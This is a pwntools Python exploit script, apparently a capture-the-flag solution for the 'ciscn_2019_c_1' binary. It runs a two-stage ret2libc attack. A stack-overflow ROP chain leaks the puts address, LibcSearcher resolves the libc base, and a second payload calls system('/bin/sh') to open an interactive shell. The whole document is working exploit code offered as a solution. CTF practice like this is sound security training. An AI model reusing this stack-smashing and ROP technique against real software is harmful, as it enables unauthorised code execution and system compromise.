from pwn import*
from LibcSearcher import*
elf=ELF('./ciscn_2019_c_1')
#p=remote('node4.buuoj.cn',26593)
p=process('./ciscn_2019_c_1')
context.log_level='debug'
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start=0x400790
pop_rdi=0x400c83
ret=0x4006b9 #栈对齐

payload=b'\x00'+b'a'*(0x50+7)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
p.sendlineafter("Input your choice!\n",b'1')
p.sendlineafter("Input your Plaintext to be encrypted",payload)
#gdb.attach(p)
p.recvuntil('Ciphertext\n')	
p.recvline()

puts_addr = u64(p.recv(7)[:-1].ljust(8,b'\x00'))
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload=b'\x00'+b'a'*0x57+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendlineafter("Input your choice!\n",b'1')
p.sendlineafter("Input your Plaintext to be encrypted",payload)
p.interactive()